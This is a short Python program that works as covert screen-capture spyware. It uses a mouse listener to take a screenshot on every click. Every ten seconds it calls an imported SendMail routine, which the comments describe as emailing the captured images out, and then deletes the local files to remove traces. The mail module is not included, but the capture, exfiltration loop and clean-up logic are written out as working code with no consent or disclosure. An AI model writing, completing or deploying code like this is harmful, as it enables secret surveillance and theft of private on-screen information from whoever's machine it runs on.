import os
import pyscreenshot
import threading
from time import sleep
from pynput.mouse import Listener as MouseListener
from mailLogger import SendMail  # Assuming SendMail is a function defined in mailLogger module

class Screenshot:
    def __init__(self, path='./screenshot/', interval=10):
        self.path = path
        self.interval = interval
        self.image_number = 0
        self.create_directory()

    def create_directory(self):
        if not os.path.isdir(self.path):
            os.mkdir(self.path)

    def take_screenshot(self):
        image = pyscreenshot.grab()
        file_path = f"{self.path}Screenshot_{self.image_number}.png"
        image.save(file_path)
        self.image_number += 1

    def clean_directory(self):
        for file in os.listdir(self.path):
            os.remove(os.path.join(self.path, file))
        print('Files cleaned...')

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.take_screenshot()
            print('Screenshot taken')

    def report(self):
        SendMail()  # Assuming SendMail function sends an email with attached screenshots
        print('Mail sent')
        self.clean_directory()
        threading.Timer(self.interval, self.report).start()

    def start(self):
        with MouseListener(on_click=self.on_click) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    screenshot = Screenshot()
    screenshot.start()
